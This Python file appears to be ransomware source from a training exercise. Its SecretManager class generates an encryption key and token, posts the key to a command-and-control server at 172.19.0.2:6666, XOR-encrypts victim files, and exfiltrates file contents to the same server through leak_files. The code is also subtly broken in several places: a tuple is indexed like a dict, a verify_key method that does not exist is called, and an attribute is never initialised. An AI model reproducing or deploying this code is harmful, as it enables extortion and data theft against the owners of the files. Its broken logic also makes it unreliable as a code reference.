from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple

import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile


class SecretManager:

    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 32

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)



    def do_derivation(self, salt:bytes, key:bytes)-> bytes:

        # Salt derivation
        salt_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=self.SALT_LENGTH,
                        salt=secrets.token_bytes(16),
                        iterations=self.ITERATION)

        salt = salt_derivation.derive(salt)

        # Key derivation
        kdf_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=self.KEY_LENGTH,
                        salt=salt,
                        iterations=self.ITERATION)
        
        kdf = kdf_derivation.derive(key)

        return kdf, salt




    def create(self)-> Tuple[bytes, bytes, bytes]:
        
        salt = secrets.token_bytes(self.SALT_LENGTH) # Génèrer un sel aléatoire
        key = secrets.token_bytes(self.KEY_LENGTH) # Génèrer une clé privée aléatoire
        token = secrets.token_bytes(self.TOKEN_LENGTH) # Génèrer un jeton aléatoire

        return salt, key, token

    

    def bin_to_b64(self, data:bytes)-> str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    
    # Post request to the CNC 
    def post_new(self, salt:bytes, key:bytes, token:bytes)-> None:
        payload = {
            "token" : self.bin_to_b64(token),
            "salt"  : self.bin_to_b64(salt),
            "key"   : self.bin_to_b64(key)
        }
        requests.post("http://172.19.0.2:6666/new", json=payload)


    def setup(self)-> None:
        
        # main function to create crypto data and register malware to cnc
        tokens_generated = self.create()

        # Derivation key
        self._key, self._salt = self.do_derivation(tokens_generated["salt"], tokens_generated["key"])
        self._token = tokens_generated["token"]

        # Client folder
        folder_token_name = "/root/token"

        # Token folder's existance verification
        try:
            os.makedirs(folder_token_name)
        except:
            return
        
        with open(folder_token_name + "/token.bin", "wb") as f:
            f.write(self._token)
        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(self._salt)

        # Return the salt, key, token
        self.post_new(self._salt, self._key, self._token)


    def load(self)-> None:

        salt_file_path = os.path.join(self._path, "salt_data.bin")
        token_file_path = os.path.join(self._path, "token_data.bin")

        if os.path.exists(salt_file_path) and os.path.exists(token_file_path):
            with open(salt_file_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_file_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info("Encryption data does not exist")




    def check_key(self, candidate_key:bytes)-> bool:
       
        token = self.get_hex_token()

        # Request verification key
        payload = {
            "token": self.bin_to_b64(token), 
            "key": self.bin_to_b64(candidate_key)
            }

        response = requests.post("http://172.19.0.2:6666/key", json=payload)
        resp = response.json()
        
        if resp["valide"]==1:
            return True
        else:
            return False


    def set_key(self, b64_key:str)-> None:
  
        candidate_key = base64.b64decode(b64_key)

        if self.verify_key(candidate_key):
            self._key = candidate_key
            self._log.info("Key successfully set")
        else:
            self._log.error("Invalid key provided")
            raise ValueError("Invalid key")



    def get_hex_token(self)-> str:
        # Should return a string composed of hex symbole, regarding the token 
        token = ""
        
        with open("/root/token/token.bin", "rb") as f:
            token = f.read()

        return token



    def xorfiles(self, files:List[str])-> None:
        # xor a list for file
        for file in files:
            self._files_encrypted[str(file)] = xorfile(file, self._key)



    def leak_files(self, files:List[str])-> None:
        # send file, geniune path and token to the CNC
        payload = {}

        for file in files:
            token = self.get_hex_token()
            with open(file, "r") as f: 
                payload["token"] = self.bin_to_b64(token) 
                payload[str(file)]= f.read()
        requests.post("http://172.19.0.2:6666/files", json=payload)
           
        return {}



    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()